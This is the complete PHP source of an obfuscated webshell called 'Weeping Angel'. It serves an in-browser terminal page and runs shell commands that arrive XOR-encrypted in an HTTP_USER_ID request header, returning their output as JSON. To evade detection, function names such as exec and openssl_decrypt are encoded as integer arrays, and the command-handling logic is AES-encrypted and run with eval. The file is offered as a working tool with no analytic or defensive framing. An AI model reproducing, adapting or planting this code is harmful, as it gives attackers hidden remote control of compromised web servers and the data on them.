<?php
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        echo base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgogICAgPGhlYWQ+CiAgICAgICAgPHRpdGxlPldlZXBpbmcgQW5nZWwgV2Vic2hlbGw8L3RpdGxlPgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NvZGUuanF1ZXJ5LmNvbS9qcXVlcnktMy4zLjEubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly91bnBrZy5jb20vanF1ZXJ5LnRlcm1pbmFsL2pzL2pxdWVyeS50ZXJtaW5hbC5taW4uanMiPjwvc2NyaXB0PgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly91bnBrZy5jb20vanF1ZXJ5LnRlcm1pbmFsL2Nzcy9qcXVlcnkudGVybWluYWwubWluLmNzcyIvPicKICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvY3J5cHRvLWpzLzQuMS4xL2NyeXB0by1qcy5taW4uanMiPjwvc2NyaXB0PicKICAgICAgICA8IS0tIEhUTUwgVGVybWluYWw6IGh0dHBzOi8vaXRuZXh0LmlvL2hvdy10by1jcmVhdGUtaW50ZXJhY3RpdmUtdGVybWluYWwtbGlrZS13ZWJzaXRlLTg4OGJiMDk3MjI4OCAtLT4KICAgIDwvaGVhZD4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CiAgICAgICAgfQogICAgICAgIC50ZXJtaW5hbCwgc3BhbiB7CiAgICAgICAgICAgIC0tc2l6ZTogMS4yOwogICAgICAgIH0KICAgIDwvc3R5bGU+CiAgICA8Ym9keT4KICAgICAgICA8ZGl2PgogICAgICAgICAgICA8c2NyaXB0PgogICAgICAgICAgICAgICAgICAgIHZhciBjdXJyZW50UGF0aCA9ICIuIjsKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBnZXRSYW5kb21WYWx1ZSgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHJlc3VsdCAgICAgICAgICAgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNoYXJhY3RlcnMgICAgICAgPSAnQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODknOwogICAgICAgICAgICAgICAgICAgICAgICB2YXIgY2hhcmFjdGVyc0xlbmd0aCA9IGNoYXJhY3RlcnMubGVuZ3RoOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKCB2YXIgaSA9IDA7IGkgPCAxMDsgaSsrICkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0ICs9IGNoYXJhY3RlcnMuY2hhckF0KE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIGNoYXJhY3RlcnNMZW5ndGgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gZW5jcnlwdENvbW1hbmQoaW5wdXQsIGtleSkgewoKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSAnJzsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGtleS5sZW5ndGggPCBpbnB1dC5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtleSArPSBrZXk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yKHZhciBpPTA7IGk8aW5wdXQubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciB2YWx1ZTEgPSBpbnB1dFtpXS5jaGFyQ29kZUF0KDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHZhbHVlMiA9IGtleVtpXS5jaGFyQ29kZUF0KDApOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciB4b3JWYWx1ZSA9IHZhbHVlMSBeIHZhbHVlMjsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgeG9yVmFsdWVBc0hleFN0cmluZyA9IHhvclZhbHVlLnRvU3RyaW5nKCIxNiIpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh4b3JWYWx1ZUFzSGV4U3RyaW5nLmxlbmd0aCA8IDIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB4b3JWYWx1ZUFzSGV4U3RyaW5nID0gIjAiICsgeG9yVmFsdWVBc0hleFN0cmluZzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjICs9IHhvclZhbHVlQXNIZXhTdHJpbmc7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGM7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBzZW5kQ29tbWFuZChjb21tYW5kLCB0ZXJtaW5hbCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgLy8gVG8ga2VlcCB0cmFjayBvZiBjdXJyZW50IGZvbGRlci4KICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvcHlDb21tYW5kID0gY29tbWFuZDsKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9ICJjZCAiICsgY3VycmVudFBhdGggKyAiOyIrIGNvbW1hbmQ7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3B5Q29tbWFuZC5zdGFydHNXaXRoKCJjZCAiKSkKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IGNvbW1hbmQgKyAiO3B3ZCI7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB2YXIga2V5ID0gZ2V0UmFuZG9tVmFsdWUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBheWxvYWQgPSAiVWZlaml3ZWsiICArIENyeXB0b0pTLmVuYy5CYXNlNjQuc3RyaW5naWZ5KENyeXB0b0pTLmVuYy5VdGY4LnBhcnNlKGtleSArIGVuY3J5cHRDb21tYW5kKGNvbW1hbmQsIGtleSkpKQoKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogICAgICAgICAgICAgICAgICAgICAgICB4aHIub3BlbigiUE9TVCIsICIuLi93ZWVwaW5nQW5nZWwucGhwIiwgdHJ1ZSk7IC8vIEZvciB0ZXN0aW5nIC4uL3dlZXBpbmdBbmdlbC5waHAgZWxzZSAiIgogICAgICAgICAgICAgICAgICAgICAgICB4aHIuc2V0UmVxdWVzdEhlYWRlcigiVVNFUl9JRCIsIHBheWxvYWQpOwogICAgICAgICAgICAgICAgICAgICAgICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAodGhpcy5yZWFkeVN0YXRlICE9IDQpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAodGhpcy5zdGF0dXMgPT0gMjAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHJlc3BvbnNlID0gSlNPTi5wYXJzZSh0aGlzLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG91dHB1dExlbiA9IHJlc3BvbnNlLmxlbmd0aDsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gVXBkYXRlIGN1cnJlbnQgcGF0aC4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29weUNvbW1hbmQuc3RhcnRzV2l0aCgnY2QgJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0TGVuID0gb3V0cHV0TGVuIC0xOyAvLyBTa2lwIGxhc3QgcmVzZXJ2ZWQgb3V0cHV0LgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50UGF0aCA9IHJlc3BvbnNlW3Jlc3BvbnNlLmxlbmd0aCAtMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IG91dHB1dExlbjsgaSsrKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZXJtaW5hbC5lY2hvKHJlc3BvbnNlW2ldKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlcm1pbmFsLmVjaG8oIldlYnNoZWxsIHJlcXVlc3QgZmFpbGVkLCByZXR1cm5lZCBjb2RlICIgKyB0aGlzLnN0YXR1cyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgeGhyLnNlbmQoKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICQoJ2RpdicpLnRlcm1pbmFsKGZ1bmN0aW9uKGNvbW1hbmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoKGNvbW1hbmQpIAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImhlbGxvIjogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5lY2hvKCJIaSIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiaGVscCI6IHsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGlzLmVjaG8oIldlZXBpbmdBbmdlbCBXZWJTaGVsbCAxLjBcblxuaGVscCAgPyAgYXV0aG9yICBleGl0XG5jbGVhciAkKGFueSBjdXJyZW50IGluc3RhbGxlZCBjb21tYW5kKSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJhdXRob3IiOiAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5lY2hvKCJXZWVwaW5nQW5nZWwgMS4wIChjKSAyMDIyIHJhbWIwXG4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAid2VlcGluZyBhbmdlbCI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuZWNobygkKCc8aW1nIHNyYz0iaHR0cHM6Ly9jZG5hLmFydHN0YXRpb24uY29tL3AvYXNzZXRzL2ltYWdlcy9pbWFnZXMvMDA2LzI2NS8zNzgvbGFyZ2UvZGVkeS1kLXdlZXBpbmdhbmdlbC5qcGc/MTQ5NzI2NDg3OCZkbD0xIj4nKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb21tYW5kID09ICIiIHx8IGNvbW1hbmQubGVuZ3RoID09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZW5kQ29tbWFuZChjb21tYW5kLCB0aGlzKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9LCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGdyZWV0aW5nczogCiAgICAgICAgICAgICAgICAgICAgICAgICIg4paIICAgICDilojilpPilojilojilojilojilojilpPilojilojilojilojilogg4paI4paI4paT4paI4paI4paIICDilojilojilpPilojilojilojiloQgICAg4paIICDiloTilojilojilojilogg4paE4paE4paEICAgICAg4paI4paI4paI4paEICAgIOKWiCAg4paE4paI4paI4paI4paI4paT4paI4paI4paI4paI4paIIOKWiOKWiOKWkyAgICBcbiIrCiAgICAgICAgICAgICAgICAgICAgICAgICLilpPilojilpEg4paIIOKWkeKWiOKWk+KWiCAgIOKWgOKWk+KWiCAgIOKWgOKWk+KWiOKWiOKWkSAg4paI4paI4paT4paI4paI4paS4paI4paIIOKWgOKWiCAgIOKWiCDilojilojilpIg4paA4paI4paS4paI4paI4paI4paI4paEICAgIOKWiOKWiCDiloDiloggICDilogg4paI4paI4paSIOKWgOKWiOKWk+KWiCAgIOKWgOKWk+KWiOKWiOKWkiAgICBcbiIrCiAgICAgICAgICAgICAgICAgICAgICAgICLilpLilojilpEg4paIIOKWkeKWiOKWkuKWiOKWiOKWiCAg4paS4paI4paI4paIICDilpPilojilojilpEg4paI4paI4paT4paS4paI4paI4paT4paI4paIICDiloDilogg4paI4paI4paS4paI4paI4paR4paE4paE4paE4paS4paI4paIICDiloDilojiloQg4paT4paI4paIICDiloDilogg4paI4paI4paS4paI4paI4paR4paE4paE4paE4paS4paI4paI4paIICDilpLilojilojilpEgICAgXG4iKwogICAgICAgICAgICAgICAgICAgICAgICAi4paR4paI4paRIOKWiCDilpHilojilpLilpPiloggIOKWhOKWkuKWk+KWiCAg4paE4paS4paI4paI4paE4paI4paT4paSIOKWkeKWiOKWiOKWk+KWiOKWiOKWkiAg4paQ4paM4paI4paI4paR4paT4paIICDilojilojilpHilojilojiloTiloTiloTiloTilojilojilpPilojilojilpIgIOKWkOKWjOKWiOKWiOKWkeKWk+KWiCAg4paI4paI4paS4paT4paIICDiloTilpLilojilojilpEgICAgXG4iKwogICAgICAgICAgICAgICAgICAgICAgICAi4paR4paR4paI4paI4paS4paI4paI4paT4paR4paS4paI4paI4paI4paI4paR4paS4paI4paI4paI4paI4paS4paI4paI4paSIOKWkSAg4paR4paI4paI4paS4paI4paI4paRICAg4paT4paI4paI4paR4paS4paT4paI4paI4paI4paA4paS4paT4paIICAg4paT4paI4paI4paS4paI4paI4paRICAg4paT4paI4paI4paR4paS4paT4paI4paI4paI4paA4paR4paS4paI4paI4paI4paI4paR4paI4paI4paI4paI4paI4paI4paSXG4iKwogICAgICAgICAgICAgICAgICAgICAgICAi4paRIOKWk+KWkeKWkiDilpIg4paR4paRIOKWkuKWkSDilpHilpEg4paS4paRIOKWkuKWk+KWkuKWkSDilpEgIOKWkeKWkyDilpEg4paS4paRICAg4paSIOKWkiDilpHilpIgICDilpIg4paS4paSICAg4paT4paS4paI4paRIOKWkuKWkSAgIOKWkiDilpIg4paR4paSICAg4paS4paR4paRIOKWkuKWkSDilpEg4paS4paR4paTICDilpFcbiIrCiAgICAgICAgICAgICAgICAgICAgICAgICIgIOKWkiDilpEg4paRICDilpEg4paRICDilpHilpEg4paRICDilpHilpIg4paRICAgICDilpIg4paRIOKWkeKWkSAgIOKWkSDilpLilpEg4paRICAg4paRICDilpIgICDilpLilpIg4paRIOKWkeKWkSAgIOKWkSDilpLilpEg4paRICAg4paRIOKWkSDilpEgIOKWkSDilpEg4paSICDilpFcbiIrCiAgICAgICAgICAgICAgICAgICAgICAgICIgIOKWkSAgIOKWkSAgICDilpEgICAgIOKWkSAg4paR4paRICAgICAgIOKWkiDilpEgIOKWkSAgIOKWkSDilpHilpEg4paRICAg4paRICDilpEgICDilpIgICAgIOKWkSAgIOKWkSDilpHilpEg4paRICAg4paRICAg4paRICAgIOKWkSDilpEgICBcbiIrCiAgICAgICAgICAgICAgICAgICAgICAgICIgICAg4paRICAgICAg4paRICDilpEgIOKWkSAg4paRICAgICAgICDilpEgICAgICAgICAg4paRICAgICAg4paRICAgICAg4paRICDilpEgICAgICAgIOKWkSAgICAgIOKWkSAgIOKWkSAg4paRICAg4paRICDilpFcbiIrCiAgICAgICAgICAgICAgICAgICAgICAgICJXYWhoIEl0J3MgdGhlIHdlZXBpbmcgYW5nZWwhXG4iLAogICAgICAgICAgICAgICAgICAgICAgICBwcm9tcHQ6ICJAbmdlbH4kICIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICA8L3NjcmlwdD4KICAgICAgICA8L2Rpdj4KICAgIDwvYm9keT4KPC9odG1sPg==");
        die();
    }

    $feijijgr = "Ufejiwek"; // Prefix!!
    $fnj = "ifnefne";
    $mtngt = "fjeingre";
    $krsjgfs = "vrafefk";  // Key 4
    $grmg = "gjrignjss";
    $kkgrngj = "fenfnjafejognek"; // key 1
    $ohton = "gmrkgn";
    $krsng = "fejamfmrk"; // key 2
    $fkegsnrsj = "fjsfnjsr"; // key 3
    $hktohm = ""; // Our nothing string.
    $nrg = 0;
    $bef = 1;
    $kgr = 5;
    $gn = 8;
    $grj = 12;
    $kfoem = 127;
    $jgr = 54;
    $kgr = 10;
    $jf = 9;

    // Our function name decoder.
    $thkot=function($kgro){$fsiej = null;for ($kor = 0;$kor < count($kgro); $kor += 3) { $fsiej = $fsiej . chr($kgro[$kor]);}return $fsiej;};
    
    // str_replace() string.
    $jriegn = [115,246,205,116,72,21,114,49,47,95,35,75,114,197,182,101,58,162,112,53,31,108,4,86,97,133,39,99,12,150,101,224,94]; // str_replace()
    $ngrggf = $thkot($jriegn); // str_replace()

    // exec() string.
    $mgrrn = [95,154,181,102,137,75,101,253,219,104,249,216,117,136,54,102,172,97,101,52,107,95,241,158,102,123,15,101,41,52,104,247,254,117,73,89,102,81,103,120,20,110,95,217,24,102,227,197,101,19,243,104,120,210,117,146,175,102,174,192,101,3,180,99,51,217,95,176,164,102,100,176,101,60,79,104,50,119,117,20,67,102,142,208];
    $bwdg = [95,21,202,102,69,190,101,59,193,104,177,1,117,166,72,102,240,91]; // The string to replace.
    $grlm = $ngrggf($thkot($bwdg), $hktohm, $thkot($mgrrn)); // Makes exec() from { str_replace("_fehuf", "", $execStr) }

    // openssl_decrypt() string.
    $jgirg = [111,172,27,103,104,169,104,134,60,114,187,108,105,231,174,103,15,227,112,1,62,101,91,178,110,181,48,115,46,103,103,182,143,104,62,220,114,254,63,105,219,170,103,243,101,115,32,151,103,250,65,104,177,163,114,238,158,105,87,192,103,26,148,108,88,178,95,190,243,100,209,107,101,6,197,99,146,23,103,241,157,104,103,87,114,201,240,105,33,169,103,139,71,114,225,135,121,245,205,103,3,60,104,227,77,114,232,66,105,84,177,103,45,44,112,55,139,103,233,193,104,215,85,114,78,65,105,168,79,103,42,202,116,239,60];
    $nrjgn = [103,45,35,104,188,17,114,245,65,105,249,31,103,153,248];
    $ngkgrn = $ngrggf($thkot($nrjgn), $hktohm, $thkot($jgirg)); // Makes openssl_decrypt() from { str_replace("ghrig", "", $opensslStr) }

    // base64_decode() string.
    $fjejf = [98,34,227,97,184,176,98,134,223,98,60,110,101,200,19,119,79,185,102,245,6,115,61,59,98,194,247,98,25,211,101,252,198,119,116,116,102,63,124,101,83,114,54,51,228,98,152,229,98,4,20,101,13,100,119,135,129,102,241,215,52,1,84,95,86,192,100,1,42,98,132,99,98,204,160,101,6,24,119,213,24,102,176,140,101,25,250,99,203,200,98,22,5,98,121,50,101,250,8,119,164,125,102,123,109,111,32,159,98,1,81,98,73,48,101,32,157,119,90,164,102,45,149,100,217,94,98,90,220,98,132,71,101,28,227,119,73,95,102,46,111,101,130,119];
    $kfemf = [98,18,104,98,76,164,101,90,217,119,201,140,102,164,10];
    $gkroa = $ngrggf($thkot($kfemf), $hktohm, $thkot($fjejf)); // Makes base64_decode() from { str_replace("bbewf", "", $base64DStr) }
    
    // substr() string.
    $korgne = [115,32,5,110,80,97,114,13,74,106,111,163,103,22,254,110,126,156,117,71,166,98,58,72,110,149,252,114,158,140,106,205,199,103,154,150,110,188,3,115,195,46,116,172,88,110,148,86,114,118,69,106,97,145,103,93,153,110,162,8,114,144,182];
    $mwent = [110,44,130,114,88,164,106,96,173,103,151,13,110,210,63];
    $fefknk = $ngrggf($thkot($mwent), $hktohm, $thkot($korgne)); // Makes substr() from { str_replace("nrjgn", "", $substrStr) }

    // HTTP_USER_ID string.
    $kgjoregn = [72,60,8,103,130,166,107,170,244,114,113,104,111,231,93,103,9,86,109,202,203,84,226,199,84,253,35,103,140,166,107,250,254,114,19,215,111,109,225,103,73,191,109,233,113,80,20,28,95,50,60,103,9,26,107,50,177,114,159,2,111,171,247,103,223,54,109,95,181,85,16,116,83,173,147,103,161,75,107,230,29,114,145,64,111,37,44,103,162,105,109,94,164,69,66,210,82,21,31,95,12,196,73,117,144,103,187,125,107,2,114,114,157,21,111,54,17,103,145,70,109,203,250,68,183,118];
    $roggrn = [103,47,1,107,11,13,114,168,12,111,197,50,103,240,154,109,245,249];
    $bbewf = $ngrggf($thkot($roggrn), $hktohm, $thkot($kgjoregn)); // Makes HTTP_USER_ID from { str_replace("gkrogm", "", $HTTPstr)}

    // METHOD AES string.
    $jegingi = [65,20,212,116,171,244,104,228,60,107,205,73,111,142,222,116,72,180,69,245,103,116,4,117,104,26,34,107,139,38,111,222,62,116,102,228,83,16,124,45,14,105,49,188,143,116,198,196,104,16,98,107,87,233,111,223,200,116,77,163,50,8,125,116,92,105,104,184,219,107,225,10,111,110,235,116,83,22,56,251,148,45,206,191,67,175,114,116,49,214,104,234,127,107,181,43,111,47,171,116,29,165,84,35,108,116,34,223,104,172,118,107,150,77,111,234,212,116,137,107,82,245,164];
    $fanjfe = [116,149,110,104,239,49,107,74,112,111,37,252,116,193,115];
    $pohdto = $ngrggf($thkot($fanjfe), $hktohm, $thkot($jegingi)); // Makes AES-128-CTR from { str_replace("thkot", "", $aesStr) }

    // First decrypt our command-getter string than execute with eval().
    //$knenge = "\$pofnef = \$_SERVER[\$bbewf];if (\$fefknk(\$pofnef, \$nrg, \$gn) !== \$feijijgr) {die();}";
    //$fijae = "\$grmkgk = \$ngrggf(\$feijijgr, \$hktohm, \$pofnef);";
    // $command = $_SERVER['HTTP_USER_ID'];
    // if (substr($command, 0, 8) !== $feijijgr) {
    //     echo "Invalid command!";
    //     die();
    // }
    // // Delete prefix of our command.
    // $command = $ngrggf($preFix, "", $command);
    $fjeinf = "dwyEZxolkcqvDRKacqw6A8+DutOsIvvTeGLapTtx8NZLL9kJHHX4/M9zm4KJfVzQdHduvAISRtIKVMUCUTm81C0sMh9/Gc0hi1eIDBLCA9uXRJIfte59bWYWvn5kfeKbwJGf0ACGXt/U0nBmJj4Ne3RYVs2PhPkRbjPuqoX7+lLV";
    
    // $mofeofm = function($koeja, $kogr) {
    //     $kogr($koeja . " 2>&1", $kfoeka, $gkrok);
    //     if ($gkrok === 127) {
    //         $kfoeka = ["Error: Command not found!\n"];
    //     }
    //     return $kfoeka;
    // };
    $koado = "nh2Bp3+buPFjQJ+S+TWAJiD1ZwNMemztoIOMNkbQXWljkrpYUp31RYiSc9yq8SpA0IVhyAozwK/kc604HuRG2tUzA1lVgvY0QaoDNLaUhVGdr/QQf+d/vVDMhS2fh8nINs4wZnEUxhVbDJ0PPSrlNu3nmVX55hI1IrVFvXZS3YRD2dQ+HQ34ujGVllSDqXhkuPhApkcoxWKBt1rAOg==";

    // $nrkngw = function($poreeg) {
    //     $mkvmes='';
    //     for ($i=0; $i < strlen($poreeg)-1; $i+=2){
    //         $mkvmes .= chr(hexdec($poreeg[$i].$poreeg[$i+1]));
    //     }
    //     return $mkvmes;
    // };
    $fmekf = "AlvVHgwfkNZcaNNpmZ6hxpC0LWfMPfTjzZf6v+MU6K53tutNiraQE4R13nN5riPkwcGxjZitwgqmx7eAzxVPABdl/rvFYmlV/5NNpSk//8RXDHBCXuawFrhZcFcEtSfcnZk9B7vVq700AMZH722AqhZhlIpL0MgNxABU8E42ZOvwjGHoOwV9zaYXvVrUZZQkwJp41t0u";
    
    // $ngrjsng = function ($string, $key) {
    // $text = hexToStr($string);
    // $outText = '';
    //     for($i=0; $i<strlen($text); )
    //     {
    //         for($j=0; ($j<strlen($key) && $i<strlen($text)); $j++,$i++)
    //         {
    //             $outText .= $text{$i} ^ $key{$j};
    //         }
    //     }
    //     return $outText;
    // };
    $maaeff = "9E3C4TM81R+ptESH1Wd2lNxQ4cQ0OReI7CJx+OnNqwqvhOctQUDKFHA5jhggMN0DsDT/xI8bc4pOuPmL8x9os3d8yp262AmEUaeyK95OfgYxhjKF8zGJn+LPmv3uWjmKb4xA/VNg9EHEvR9Yrzk4paGxa4gV17mZrZr073zp+rgvR+dxaOeFbceP+SioZRv/Uy2J88gGpcWM1Bs5dZiwxODHYGVZy2qzpxRgysTrV+GeP2G4nkISVxRCez1/niQ/waSyqAM3X02ftcdiv20VCO77pIQ5k4Sdt39AVJ2dqmk=";
 
    eval($ngkgrn($fjeinf, $pohdto, $kkgrngj). $ngkgrn($koado, $pohdto, $krsng) .
        $ngkgrn($fmekf, $pohdto, $fkegsnrsj) . $ngkgrn($maaeff, $pohdto, $krsjgfs));

    // Now we decode the command and key.
    $faenjfa = $fefknk($gkroa($grmkgk), $nrg, $kgr); // Key. from substr(headerValue, 0, 10);
    $fjesin = $fefknk($gkroa($grmkgk), $kgr);  // Encrypted command. from substr(headerValue, 10);

    // Now we decrypt the command.
    $jirgiin = $ngrjsng($nrkngw($fjesin), $faenjfa); //$ngkgrn($fjesin, $pohdto, $faenjfa);

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($mofeofm($jirgiin, $grlm));
    die();
?>



